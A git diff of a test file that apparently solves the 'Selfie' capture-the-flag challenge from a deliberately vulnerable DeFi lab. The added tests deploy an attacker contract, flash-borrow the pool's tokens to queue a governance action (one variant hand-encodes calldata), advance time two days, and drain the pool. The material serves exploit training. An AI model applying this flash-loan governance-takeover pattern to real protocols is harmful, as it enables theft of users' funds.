@@ -9,7 +9,7 @@ describe('[Challenge] Selfie', function () {
     const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
     const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
     
-    before(async function () {
+    beforeEach(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
 
@@ -37,11 +37,34 @@ describe('[Challenge] Selfie', function () {
 
     });
 
-    it('Execution', async function () {
+    it('Execution onchain', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('SelfieAttacker', player)).deploy(pool.address, governance.address, token.address)
+
+        await attacker.connect(player).attackOnchainPt1(1500000n * 10n ** 18n)
+
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+        await attacker.connect(player).attackPt2()
     });
 
-    after(async function () {
+    it('Execution offchain', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('SelfieAttacker', player)).deploy(pool.address, governance.address, token.address)
+
+        const data = ethers.utils.hexConcat([
+            '0xa441d067', //TODO
+            ethers.utils.defaultAbiCoder.encode(['address'], [player.address])
+        ])
+
+        await attacker.connect(player).attackOffchainPt1(1500000n * 10n ** 18n, data)
+
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+        await attacker.connect(player).attackPt2()
+    });
+
+    afterEach(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
         // Player has taken all tokens from the pool
